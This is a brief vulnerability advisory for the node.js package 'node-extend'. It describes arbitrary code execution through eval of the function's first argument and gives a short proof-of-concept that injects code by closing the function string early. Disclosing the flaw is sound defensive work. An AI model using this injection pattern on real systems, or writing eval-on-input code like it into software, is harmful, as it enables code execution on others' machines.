# Overview

`node-extend` is an extend for node.js.

This package is vulnerable to Arbitrary Code Execution. User input provided to the argument `A` of extend `function(A,B,as,isAargs)` found within `lib/extend.js` is executed by the `eval` function, resulting in code execution.

# Proof of Concept

```
var extend = require("node-extend");
foo = extend("function (){});console.log(234); //(){console.log(123)}","")
console.log(foo);
```
